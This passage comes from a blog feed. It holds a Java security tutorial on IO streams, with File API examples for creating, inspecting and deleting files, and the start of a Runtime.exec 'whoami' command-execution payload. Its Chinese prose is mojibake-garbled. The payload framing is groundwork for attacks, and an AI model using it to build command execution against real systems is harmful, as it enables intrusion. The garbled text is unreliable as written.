href="https://drun1baby.top/2022/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-04-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-04-JDKåŠ¨æ€ä»£ç† | Drunkbabyâ€™s Blog</a></p><p><a href="https://zhuanlan.zhihu.com/p/72644638">è®¾è®¡æ¨¡å¼ï¼ˆå››ï¼‰â€”â€”ææ‡‚ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼ - çŸ¥ä¹</a></p><p><a href="https://www.bilibili.com/video/BV1mc411h719?t=1062.4&p=11">https://www.bilibili.com/video/BV1mc411h719?t=1062.4&amp;p=11</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-IOæµ</title>
    <link href="/2025/08/19/Java%E5%AE%89%E5%85%A8-IO%E6%B5%81/"/>
    <url>/2025/08/19/Java%E5%AE%89%E5%85%A8-IO%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-IOæµ"><a href="#Javaå®‰å…¨-IOæµ" class="headerlink" title="Javaå®‰å…¨-IOæµ"></a>Javaå®‰å…¨-IOæµ</h1><h2 id="åˆè¯†IOæµ"><a href="#åˆè¯†IOæµ" class="headerlink" title="åˆè¯†IOæµ"></a>åˆè¯†IOæµ</h2><p>IOæ˜¯æŒ‡ Input&#x2F;Outputï¼Œå³è¾“å…¥å’Œè¾“å‡ºã€‚ä»¥å†…å­˜ä¸ºä¸­å¿ƒï¼š</p><p>ä¸ºä»€ä¹ˆè¦æŠŠæ•°æ®è¯»åˆ°å†…å­˜æ‰èƒ½å¤„ç†è¿™äº›æ•°æ®ï¼Ÿå› ä¸ºä»£ç æ˜¯åœ¨å†…å­˜ä¸­è¿è¡Œçš„ï¼Œæ•°æ®ä¹Ÿå¿…é¡»è¯»åˆ°å†…å­˜ï¼Œæœ€ç»ˆçš„è¡¨ç¤ºæ–¹å¼æ— éæ˜¯ byteæ•° ç»„ï¼Œå­—ç¬¦ä¸²ç­‰ï¼Œéƒ½å¿…é¡»å­˜æ”¾åœ¨å†…å­˜é‡Œã€‚</p><p>ä» Java ä»£ç æ¥çœ‹ï¼Œè¾“å…¥å®é™…ä¸Šå°±æ˜¯ä»å¤–éƒ¨ï¼Œä¾‹å¦‚ï¼Œç¡¬ç›˜ä¸Šçš„æŸä¸ªæ–‡ä»¶ï¼ŒæŠŠå†…å®¹è¯»åˆ°å†…å­˜ï¼Œå¹¶ä¸”ä»¥ Java æä¾›çš„æŸç§æ•°æ®ç±»å‹è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼Œ<code>byte[]</code>ï¼Œ<code>String</code>ï¼Œè¿™æ ·ï¼Œåç»­ä»£ç æ‰èƒ½å¤„ç†è¿™äº›æ•°æ®ã€‚</p><p>å› ä¸ºå†…å­˜æœ‰â€œæ˜“å¤±æ€§â€çš„ç‰¹ç‚¹ï¼Œæ‰€ä»¥å¿…é¡»æŠŠå¤„ç†åçš„æ•°æ®ä»¥æŸç§æ–¹å¼è¾“å‡ºï¼Œä¾‹å¦‚ï¼Œå†™å…¥åˆ°æ–‡ä»¶ã€‚Output å®é™…ä¸Šå°±æ˜¯æŠŠ Java è¡¨ç¤ºçš„æ•°æ®æ ¼å¼ï¼Œä¾‹å¦‚ï¼Œ<code>byte[]</code>ï¼Œ<code>String</code>ç­‰è¾“å‡ºåˆ°æŸä¸ªåœ°æ–¹ã€‚</p><p>IO æµæ˜¯ä¸€ç§é¡ºåºè¯»å†™æ•°æ®çš„æ¨¡å¼ï¼Œå®ƒçš„ç‰¹ç‚¹æ˜¯å•å‘æµåŠ¨ã€‚æ•°æ®ç±»ä¼¼è‡ªæ¥æ°´ä¸€æ ·åœ¨æ°´ç®¡ä¸­æµåŠ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠå®ƒç§°ä¸º IO æµã€‚</p><h2 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h2><h3 id="åˆ›å»ºæ–‡ä»¶"><a href="#åˆ›å»ºæ–‡ä»¶" class="headerlink" title="åˆ›å»ºæ–‡ä»¶"></a>åˆ›å»ºæ–‡ä»¶</h3><h4 id="æ–¹å¼ä¸€ï¼šæ ¹æ®è·¯å¾„åˆ›å»ºä¸€ä¸ª-File-å¯¹è±¡"><a href="#æ–¹å¼ä¸€ï¼šæ ¹æ®è·¯å¾„åˆ›å»ºä¸€ä¸ª-File-å¯¹è±¡" class="headerlink" title="æ–¹å¼ä¸€ï¼šæ ¹æ®è·¯å¾„åˆ›å»ºä¸€ä¸ª File å¯¹è±¡"></a>æ–¹å¼ä¸€ï¼šæ ¹æ®è·¯å¾„åˆ›å»ºä¸€ä¸ª File å¯¹è±¡</h4><ul><li>æ–¹æ³• <code>new File(String pathname)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">// æ ¹æ®è·¯å¾„åˆ›å»ºä¸€ä¸ª File å¯¹è±¡</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ–¹å¼äºŒï¼šæ ¹æ®çˆ¶ç›®å½•-File-å¯¹è±¡ï¼Œåœ¨å­è·¯å¾„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶"><a href="#æ–¹å¼äºŒï¼šæ ¹æ®çˆ¶ç›®å½•-File-å¯¹è±¡ï¼Œåœ¨å­è·¯å¾„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="æ–¹å¼äºŒï¼šæ ¹æ®çˆ¶ç›®å½• File å¯¹è±¡ï¼Œåœ¨å­è·¯å¾„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶"></a>æ–¹å¼äºŒï¼šæ ¹æ®çˆ¶ç›®å½• File å¯¹è±¡ï¼Œåœ¨å­è·¯å¾„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶</h4><ul><li>æ–¹æ³• <code>new File(File parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// æ ¹æ®çˆ¶ç›®å½•Fileå¯¹è±¡ï¼Œåœ¨å­è·¯å¾„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newFile02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">parentFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile&quot;</span>);  <br> <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parentFile, <span class="hljs-string">&quot;new2.txt&quot;</span>);  <br> <span class="hljs-keyword">try</span>&#123;  <br>            file.createNewFile();  <br> System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ–¹å¼ä¸‰ï¼šæ ¹æ®çˆ¶ç›®å½•è·¯å¾„ï¼Œåœ¨å­è·¯å¾„ä¸‹ç”Ÿæˆæ–‡ä»¶"><a href="#æ–¹å¼ä¸‰ï¼šæ ¹æ®çˆ¶ç›®å½•è·¯å¾„ï¼Œåœ¨å­è·¯å¾„ä¸‹ç”Ÿæˆæ–‡ä»¶" class="headerlink" title="æ–¹å¼ä¸‰ï¼šæ ¹æ®çˆ¶ç›®å½•è·¯å¾„ï¼Œåœ¨å­è·¯å¾„ä¸‹ç”Ÿæˆæ–‡ä»¶"></a>æ–¹å¼ä¸‰ï¼šæ ¹æ®çˆ¶ç›®å½•è·¯å¾„ï¼Œåœ¨å­è·¯å¾„ä¸‹ç”Ÿæˆæ–‡ä»¶</h4><ul><li>æ–¹æ³• <code>new File(String parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// æ ¹æ®çˆ¶ç›®å½•è·¯å¾„ï¼Œåœ¨å­è·¯å¾„ä¸‹ç”Ÿæˆæ–‡ä»¶  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newFile03</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile&quot;</span>;  <br> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new3.txt&quot;</span>;  <br> <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parentPath, fileName);  <br> <span class="hljs-keyword">try</span>&#123;  <br>            file.createNewFile();  <br> System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·å–æ–‡ä»¶ä¿¡æ¯"><a href="#è·å–æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="è·å–æ–‡ä»¶ä¿¡æ¯"></a>è·å–æ–‡ä»¶ä¿¡æ¯</h3><p>é€šè¿‡ <code>file</code> ç±»çš„æ–¹æ³•åè¿›è¡Œä¸€äº›åŸºæœ¬ä¿¡æ¯çš„è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFileInfo</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        getFileContents();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFileContents</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;Serialable/src/IOStream/CreateForFile/new1.txt&quot;</span>);  <br> System.out.println(<span class="hljs-string">&quot;æ–‡ä»¶åç§°ä¸ºï¼š&quot;</span> + file.getName());  <br> System.out.println(<span class="hljs-string">&quot;æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ä¸ºï¼š&quot;</span> + file.getAbsolutePath());  <br> System.out.println(<span class="hljs-string">&quot;æ–‡ä»¶çš„çˆ¶çº§ç›®å½•ä¸ºï¼š&quot;</span> + file.getParent());  <br> System.out.println(<span class="hljs-string">&quot;æ–‡ä»¶çš„å¤§å°(å­—èŠ‚)ä¸ºï¼š&quot;</span> + file.length());  <br> System.out.println(<span class="hljs-string">&quot;è¿™æ˜¯ä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼š&quot;</span> + file.isFile());  <br> System.out.println(<span class="hljs-string">&quot;è¿™æ˜¯ä¸æ˜¯ä¸€ä¸ªç›®å½•ï¼š&quot;</span> + file.isDirectory());  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a22.png"></p><p>æˆåŠŸè·å–</p><h3 id="æ–‡ä»¶åˆ é™¤"><a href="#æ–‡ä»¶åˆ é™¤" class="headerlink" title="æ–‡ä»¶åˆ é™¤"></a>æ–‡ä»¶åˆ é™¤</h3><ul><li>ä½¿ç”¨ <code>file.delete(æ–‡ä»¶)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-comment">// æ–‡ä»¶åˆ é™¤</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileDelete</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteFile();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>);<br>        System.out.println(file.delete() ? <span class="hljs-string">&quot;Delete Successfully&quot;</span>:<span class="hljs-string">&quot;Delete failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©åˆ é™¤</p><h3 id="ç›®å½•åˆ é™¤"><a href="#ç›®å½•åˆ é™¤" class="headerlink" title="ç›®å½•åˆ é™¤"></a>ç›®å½•åˆ é™¤</h3><ul><li>æ–¹æ³• <code>file.delete(ç›®å½•)</code>ï¼Œè¿™é‡Œæœ‰ä¸ªå°å‘ï¼Œåªæœ‰ç©ºçš„ç›®å½•æ‰å¯ä»¥åˆ é™¤ï¼Œä¸ç„¶ä¼šæ˜¾ç¤ºåˆ é™¤å¤±è´¥ã€‚</li><li>æˆ‘åœ¨ <code>CreateForFile</code> åŒçº§ç›®å½•ä¸‹æ–°å»ºäº†ä¸€ä¸ªæ–‡ä»¶å¤¹ <code>CreateForDelete</code> ç”¨ä»¥æµ‹è¯•ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">//åˆ é™¤ç›®å½•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectoryDelete</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteDirectory();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteDirectory</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/CreateForDelete&quot;</span>);<br>        System.out.println(file.delete()? <span class="hljs-string">&quot;Delete Successfully&quot;</span>:<span class="hljs-string">&quot;Delete failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸåˆ é™¤</p><h3 id="åˆ›å»ºå•çº§ç›®å½•"><a href="#åˆ›å»ºå•çº§ç›®å½•" class="headerlink" title="åˆ›å»ºå•çº§ç›®å½•"></a>åˆ›å»ºå•çº§ç›®å½•</h3><ul><li>æ–¹æ³• <code>file.mkdir()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><br><span class="hljs-comment">// åˆ›å»ºå•çº§ç›®å½•  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateSingleDirectory</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createSingleDir();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createSingleDir</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/CreateForDirectory&quot;</span>);  <br> System.out.println(file.mkdir() ? <span class="hljs-string">&quot;Create Successfully&quot;</span>:<span class="hljs-string">&quot;Create failed&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸåˆ›å»º</p><h3 id="åˆ›å»ºå¤šçº§ç›®å½•"><a href="#åˆ›å»ºå¤šçº§ç›®å½•" class="headerlink" title="åˆ›å»ºå¤šçº§ç›®å½•"></a>åˆ›å»ºå¤šçº§ç›®å½•</h3><ul><li>æ–¹æ³• <code>file.mkdirs()</code>ï¼Œæ³¨æ„å¤šäº†ä¸ª <strong>s</strong> åˆ«æé”™äº†ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br>  <br><span class="hljs-comment">// åˆ›å»ºå¤šçº§ç›®å½•  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateMultiDirectory</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createMultiDir();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultiDir</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateMultiDirectory/test&quot;</span>);  <br> System.out.println(file.mkdirs() ? <span class="hljs-string">&quot;Create Successfully&quot;</span>:<span class="hljs-string">&quot;Create failed&quot;</span>);  <br>  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IOæµåˆ†ç±»"><a href="#IOæµåˆ†ç±»" class="headerlink" title="IOæµåˆ†ç±»"></a>IOæµåˆ†ç±»</h2><p>æŒ‰ç…§æ“ä½œæ•°æ®å•ä½ä¸åŒåˆ†ä¸ºï¼š<strong>å­—èŠ‚æµ</strong>å’Œ<strong>å­—ç¬¦æµ</strong></p><ul><li>å­—èŠ‚æµï¼ˆ8bitï¼Œé€‚ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</li><li>å­—ç¬¦æµï¼ˆæŒ‰å­—ç¬¦ï¼Œå› ç¼–ç ä¸åŒè€Œå¼‚ï¼Œé€‚ç”¨äºæ–‡æœ¬æ–‡ä»¶ï¼‰</li></ul><p>æŒ‰ç…§æ•°æ®æµæµå‘ä¸åŒåˆ†ä¸ºï¼š<strong>è¾“å…¥æµ</strong>å’Œ<strong>è¾“å‡ºæµ</strong></p><p>æŒ‰ç…§æµçš„è§’è‰²ä¸åŒåˆ†ä¸ºï¼š<strong>èŠ‚ç‚¹æµ</strong>ï¼Œ<strong>å¤„ç†æµ&#x2F;åŒ…è£…æµ</strong></p><table><thead><tr><th>æŠ½è±¡åŸºç±»</th><th>å­—èŠ‚æµ</th><th>å­—ç¬¦æµ</th></tr></thead><tbody><tr><td>è¾“å…¥æµ</td><td>InputStream</td><td>Reader</td></tr><tr><td>è¾“å‡ºæµ</td><td>OutputStream</td><td>Writer</td></tr></tbody></table><p>åœ¨ <strong>Java I&#x2F;O</strong> ä½“ç³»é‡Œï¼Œè¾“å…¥ï¼ˆInputï¼‰å’Œè¾“å‡ºï¼ˆOutput) æ˜¯ <strong>ä»¥ç¨‹åºè‡ªèº«ä¸ºå‚ç…§ç‰©</strong> æ¥å®šä¹‰çš„ï¼š</p><ul><li><p>Inputï¼ˆè¾“å…¥æµï¼‰   æ˜¯æ•°æ® <strong>ä»å¤–éƒ¨ï¼ˆæ–‡ä»¶ã€ç½‘ç»œã€é”®ç›˜ç­‰ï¼‰æµå…¥åˆ°ç¨‹åº</strong></p></li><li><p>Outputï¼ˆè¾“å‡ºæµï¼‰æ˜¯æ•°æ® <strong>ä»ç¨‹åºæµå‡ºåˆ°å¤–éƒ¨ï¼ˆæ–‡ä»¶ã€ç½‘ç»œã€æ˜¾ç¤ºå™¨ç­‰ï¼‰</strong></p></li><li><p>åˆ°è¿™é‡Œå°±éå¸¸é‡è¦äº†ï¼Œå› ä¸ºå®ƒä¸æˆ‘ä»¬åç»­çš„å‘½ä»¤æ‰§è¡Œç›´æ¥ç›¸å…³ã€‚è¿™äº› IO æµåœ¨æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„ Payload å½“ä¸­å……å½“ç€ç¼“å†²çš„ä½œç”¨ã€‚</p></li></ul><h2 id="å…³äºæ–‡ä»¶æµçš„ä¸€äº›æ“ä½œ"><a href="#å…³äºæ–‡ä»¶æµçš„ä¸€äº›æ“ä½œ" class="headerlink" title="å…³äºæ–‡ä»¶æµçš„ä¸€äº›æ“ä½œ"></a>å…³äºæ–‡ä»¶æµçš„ä¸€äº›æ“ä½œ</h2><h3 id="Runtime-å‘½ä»¤æ‰§è¡Œæ“ä½œçš„-Payload"><a href="#Runtime-å‘½ä»¤æ‰§è¡Œæ“ä½œçš„-Payload" class="headerlink" title="Runtime å‘½ä»¤æ‰§è¡Œæ“ä½œçš„ Payload"></a>Runtime å‘½ä»¤æ‰§è¡Œæ“ä½œçš„ Payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><br><span class="hljs-comment">// ä½¿ç”¨ Runtime ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-comment">// é€šè¿‡ Runtime.getRuntime().exec(&quot;whoami&quot;) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ &quot;whoami&quot;</span><br>        <span class="hljs-comment">// å¹¶è·å–è¯¥è¿›ç¨‹çš„æ 